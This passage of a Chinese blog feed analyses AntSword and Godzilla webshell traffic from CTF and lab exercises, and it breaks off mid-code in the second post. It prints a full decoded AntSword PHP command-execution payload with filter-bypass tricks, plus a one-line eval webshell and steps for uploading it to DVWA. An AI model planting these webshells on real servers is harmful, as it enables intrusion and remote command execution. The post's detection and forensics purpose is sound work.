{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo • All posts by \"流量\" tag",
    "description": "",
    "home_page_url": "https://nnnpc.github.io",
    "items": [
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "蚁剑流量浅析",
            "date_published": "2024-04-16T05:58:19.061Z",
            "content_html": "<p>最近回顾了一道蚁剑的流量分析题目，就像借着这个机会记录一下学习内容</p>\n<p>先看题目</p>\n<blockquote>\n<p>题目是 2022DASCTF Apr X FATE 防疫挑战赛的流量分析题</p>\n</blockquote>\n<p>首先打开流量包，查看下 tcp 追踪流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BrLogKUK1bDSvRZr.png!thumbnail\" alt=\"\"></p>\n<p>发现了流 52 有带有 flag.txt 字样的 zip</p>\n<p>可以手动分离也可以 binwalk 或者 foremost，分离出压缩包发现是加密的</p>\n<p>那就需要找到压缩包密码，去看看之前的追踪流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UGnmP5f9GfMOWbOv.png!thumbnail\" alt=\"\"></p>\n<p>在流 50 找到了压缩包的加密过程，解码上面的密文进行阅读分析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9nPVl560teeyA72N.png!thumbnail\" alt=\"\"></p>\n<p>在这里发现了压缩包的密码 PaSsZiPWorD</p>\n<p>解压压缩包得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4pRBtAmR7ryLDMEa.png!thumbnail\" alt=\"\"></p>\n<p><strong>DASCTF{f3f32f434eddbc6e6b5043373af95ae8}</strong></p>\n<p>题目做完了就想着自己去截取流量分析一下，于是就在 ctfshow 开了一个文件上传的环境</p>\n<p>成功将马上传了之后使用蚁剑 getshell，这里是不使用任何的加密方式，采用蚁剑的虚拟终端敲了两个命令来获取 flag，截取流量进行分析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5nse7uTKfmarqikw.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uKWFk0WTCHMdIyDo.png!thumbnail\" alt=\"\"></p>\n<p>wireshark 捕获设置为 WLAN 之后点击开始，截取之后进行分析</p>\n<p>tcp 流 22：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZNH5ygLPLBzjGR5c.png!thumbnail\" alt=\"\"></p>\n<p>发现成功截取</p>\n<p>观察 tcp 追踪流，这里也显示了蚁剑流量的一个明显的特征：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=@ini_set(&quot;display_errors&quot;, &quot;0&quot;)</span><br></pre></td></tr></table></figure>\n<p>这个在蚁剑当中是以明文的方式出现的，而其他的 webshell 管理工具一般会进行加密，继续分析，这里是蚁剑中虚拟终端输入的第一个命令<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2ia6d6zo2vGm9RB1.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>将该流的这个 base64 解码能够看到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1PFy377d6fTcYlVm.png!thumbnail\" alt=\"\"></p>\n<p>可以看到后面的流一样显示截取的蚁剑流量</p>\n<p>tcp 流 33：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1W9vgNWmiVUPrsLx.png!thumbnail\" alt=\"\"></p>\n<p>该流就是输入的第二个命令了，就不演示解码了，同时在 http 流能够看到 cat<br>\nflag.php 之后的具体内容</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vgvaL6WS3qnbyt6j.png!thumbnail\" alt=\"\"></p>\n<p>同样的</p>\n<p>继续使用 base64 加解密的方式对数据进行数据处理试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AX7a0hdjCIhiohFQ.png!thumbnail\" alt=\"\"></p>\n<p>保存数据，用虚拟终端输入命令获取 flag 进行测试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YLmJEgedd3h8dOmk.png!thumbnail\" alt=\"\"></p>\n<p>可以仔细看看加密之后的一整串 base64 解码之后的样子，这里以 tcp 流 5 为例</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/q6Gf7Y2aPhC0KeeW.png!thumbnail\" alt=\"\"></p>\n<p>进行解码得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jhtAGxmT8JxJ9qmp.png!thumbnail\" alt=\"\"></p>\n<p>方便查看可以格式化一下代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class=\"line\">@set_time_limit(0);</span><br><span class=\"line\">$opdir=@ini_get(&quot;open_basedir&quot;);</span><br><span class=\"line\">if($opdir) &#123;</span><br><span class=\"line\">\t$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class=\"line\">\t$oparr=preg_split(&quot;/;|:/&quot;,$opdir);</span><br><span class=\"line\">\t@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class=\"line\">\tforeach($oparr as $item) &#123;</span><br><span class=\"line\">\t\tif(!@is_writable($item)) &#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t;</span><br><span class=\"line\">\t\t$tmdir=$item.&quot;/.6a33b73913&quot;;</span><br><span class=\"line\">\t\t@mkdir($tmdir);</span><br><span class=\"line\">\t\tif(!@file_exists($tmdir)) &#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t@chdir($tmdir);</span><br><span class=\"line\">\t\t@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class=\"line\">\t\t$cntarr=@preg_split(&quot;/\\\\\\\\|\\//&quot;,$tmdir);</span><br><span class=\"line\">\t\tfor ($i=0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class=\"line\">\t\t\t@chdir(&quot;..&quot;);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t;</span><br><span class=\"line\">\t\t@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);</span><br><span class=\"line\">\t\t@rmdir($tmdir);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">;</span><br><span class=\"line\">function asenc($out) &#123;</span><br><span class=\"line\">\treturn @base64_encode($out);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">function asoutput() &#123;</span><br><span class=\"line\">\t$output=ob_get_contents();</span><br><span class=\"line\">\tob_end_clean();</span><br><span class=\"line\">\techo &quot;95&quot;.&quot;44e&quot;;</span><br><span class=\"line\">\techo @asenc($output);</span><br><span class=\"line\">\techo &quot;1911&quot;.&quot;b6c9&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ob_start();</span><br><span class=\"line\">try &#123;</span><br><span class=\"line\">\t$p=base64_decode(substr($_POST[&quot;ka199f64875418&quot;],2));</span><br><span class=\"line\">\t$s=base64_decode(substr($_POST[&quot;n7573f80f63f59&quot;],2));</span><br><span class=\"line\">\t$envstr=@base64_decode(substr($_POST[&quot;w2b059d24e126c&quot;],2));</span><br><span class=\"line\">\t$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class=\"line\">\t$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;</span><br><span class=\"line\">\tif(substr($d,0,1)==&quot;/&quot;) &#123;</span><br><span class=\"line\">\t\t@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\t@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif(!empty($envstr)) &#123;</span><br><span class=\"line\">\t\t$envarr=explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class=\"line\">\t\tforeach($envarr as $v) &#123;</span><br><span class=\"line\">\t\t\tif (!empty($v)) &#123;</span><br><span class=\"line\">\t\t\t\t@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class=\"line\">\tfunction fe($f) &#123;</span><br><span class=\"line\">\t\t$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class=\"line\">\t\tif(empty($d)) &#123;</span><br><span class=\"line\">\t\t\t$d=array();</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">\tfunction runshellshock($d, $c) &#123;</span><br><span class=\"line\">\t\tif (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;</span><br><span class=\"line\">\t\t\tif (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;</span><br><span class=\"line\">\t\t\t\t$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);</span><br><span class=\"line\">\t\t\t\tputenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class=\"line\">\t\t\t\tif (fe(&#x27;error_log&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t\t\terror_log(&quot;a&quot;, 1);</span><br><span class=\"line\">\t\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\t\tmail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\treturn False;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t$output = @file_get_contents($tmp);</span><br><span class=\"line\">\t\t\t@unlink($tmp);</span><br><span class=\"line\">\t\t\tif ($output != &quot;&quot;) &#123;</span><br><span class=\"line\">\t\t\t\tprint($output);</span><br><span class=\"line\">\t\t\t\treturn True;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn False;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">\tfunction runcmd($c) &#123;</span><br><span class=\"line\">\t\t$ret=0;</span><br><span class=\"line\">\t\t$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class=\"line\">\t\tif(fe(&#x27;system&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@system($c,$ret);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;passthru&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@passthru($c,$ret);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;shell_exec&#x27;)) &#123;</span><br><span class=\"line\">\t\t\tprint(@shell_exec($c));</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;exec&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@exec($c,$o,$ret);</span><br><span class=\"line\">\t\t\tprint(join(&quot;</span><br><span class=\"line\">&quot;,$o));</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;popen&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t$fp=@popen($c,&#x27;r&#x27;);</span><br><span class=\"line\">\t\t\twhile(!@feof($fp)) &#123;</span><br><span class=\"line\">\t\t\t\tprint(@fgets($fp,2048));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t@pclose($fp);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;proc_open&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);</span><br><span class=\"line\">\t\t\twhile(!@feof($io[1])) &#123;</span><br><span class=\"line\">\t\t\t\tprint(@fgets($io[1],2048));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\twhile(!@feof($io[2])) &#123;</span><br><span class=\"line\">\t\t\t\tprint(@fgets($io[2],2048));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t@fclose($io[1]);</span><br><span class=\"line\">\t\t\t@fclose($io[2]);</span><br><span class=\"line\">\t\t\t@proc_close($p);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;antsystem&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@antsystem($c);</span><br><span class=\"line\">\t\t&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class=\"line\">\t\t\treturn $ret;</span><br><span class=\"line\">\t\t&#125; elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class=\"line\">\t\t\t$w=new COM(&#x27;WScript.shell&#x27;);</span><br><span class=\"line\">\t\t\t$e=$w-&gt;exec($c);</span><br><span class=\"line\">\t\t\t$so=$e-&gt;StdOut();</span><br><span class=\"line\">\t\t\t$ret.=$so-&gt;ReadAll();</span><br><span class=\"line\">\t\t\t$se=$e-&gt;StdErr();</span><br><span class=\"line\">\t\t\t$ret.=$se-&gt;ReadAll();</span><br><span class=\"line\">\t\t\tprint($ret);</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t$ret = 127;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn $ret;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">\t$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class=\"line\">\tprint ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">catch(Exception $e) &#123;</span><br><span class=\"line\">\techo &quot;ERROR://&quot;.$e-&gt;getMessage();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">asoutput();</span><br><span class=\"line\">die();</span><br></pre></td></tr></table></figure>\n<p>当查看这一串的 base64 解码的内容时</p>\n<blockquote>\n<p>这串内容可能出现在整体代码的前面，也可能能出现在整体代码的后端<br>\n尝试了几次，发现是这样的，但是具体原因还不太清楚</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hdQWdF5Rrl5BEMAR.png!thumbnail\" alt=\"\"></p>\n<p>能发现我们之前输入的最后一行 cat flag.php 命令</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/e5o5xZjl0cwyKaJ3.png!thumbnail\" alt=\"\"></p>\n<p>根据这个再去 http 流的最后一个追踪流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ItR2SF2XaVYginww.png!thumbnail\" alt=\"\"></p>\n<p>解码这段 base64 就能看到 cat flag.php 的具体内容了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ATJitJGKzlDQFCbK.png!thumbnail\" alt=\"\"></p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%93%A5%E6%96%AF%E6%8B%89v4.01%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%93%A5%E6%96%AF%E6%8B%89v4.01%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "哥斯拉v4.01流量浅析",
            "date_published": "2024-04-16T05:58:19.045Z",
            "content_html": "<p>前段时间稍微看了下哥斯拉的一些流量相关的知识点，今天就来稍微记录一下</p>\n<p>首先我就在 NSSCTF 平台开了一个 DVWA 的靶场，用文件上传来进行说明，首先先进行哥斯拉的常规使用</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tYwSyXaBAubhQ2aj.png!thumbnail\" alt=\"\"></p>\n<p>在哥斯拉左上角点击管理 -&gt; 生成</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/trsNIZqYtmGpWpWq.png!thumbnail\" alt=\"\"></p>\n<p>在如下的两个地方选择载荷和加密器，这里就选择 php 的 eval_xor_base64</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4T7VyxuaX0P0dyju.png!thumbnail\" alt=\"\"></p>\n<p>点击生成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">eval($_POST[&quot;pass&quot;]);</span><br></pre></td></tr></table></figure>\n<p>会发现是最普通的一句话木马，接着由于靶场的最低级的限制，直接上传 php 文件<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1nWr1HheRSV0yqLd.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>在哥斯拉左上角点击目标添加</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/miphcOVjEc0gIKEg.png!thumbnail\" alt=\"\"></p>\n<p>在 URL 处填写好木马存放的位置，并将有效载荷和加密器调整为木马所对应的种类，测试连接为 success 即可添加</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TIsUGlkMcq1lhJSu.png!thumbnail\" alt=\"\"></p>\n<p>接着右键进入，就能够找到如下的命令执行界面了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nTgTAk3t7gdzh5PS.png!thumbnail\" alt=\"\"></p>\n<p>基本的使用介绍完了，接下来就自己抓取流量来进行分析</p>\n<p>使用 wireshark 进行捕获</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sp0Dnl5fE8s5wP6Z.png!thumbnail\" alt=\"\"></p>\n<p>使用 ls 和 ls / 两条命令来进行测试</p>\n<p>首先在 tcp 流 13 发现了哥斯拉的特征流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kICWJZ8g22hWD5EP.png!thumbnail\" alt=\"\"></p>\n<p>借着该流来分析一下哥斯拉的流量特征</p>\n<ol>\n<li>Cookie<br>\n 这是一个强特征，在请求包 cookie 中有一个非常明显的就是末尾带分号</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sol2NjTPk0is6yDj.png!thumbnail\" alt=\"\"></p>\n<ol>\n<li>Accept<br>\n 算一个弱特征，与之前出现过的冰蝎相似，上网搜了一下，发现其实这个也是 JDK 引入的一个特征，并不是作者自定义的 Accept</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6rVe3Oi3o4syVQu4.png!thumbnail\" alt=\"\"></p>\n<ol>\n<li>响应体<br>\n这个可以算是特征比较明显的一个点了，从代码可以看到它是把一串 32 位的 md5 字符串等量拆分后分别放在 base64 编码的前后。总体的结构便为：前 16 位 md5+base64 编码 + 后 16 位 md5</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V9vRwHft8bC2CEJ7.png!thumbnail\" alt=\"\"></p>\n<p>接下来解密一下流量看看</p>\n<p>这里使用的解密脚本是 github 上的一个 python 脚本</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dlYnJheWJ0bC93ZWJzaGVsbF9kZXRlY3Q=\">https://github.com/webraybtl/webshell_detect</span><br>\n 之前我们使用的加密体是 php_eval_xor_base64，因此请求体的构成为明文可执行代码 + 加密数据，在脚本内找到对应的解密模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span 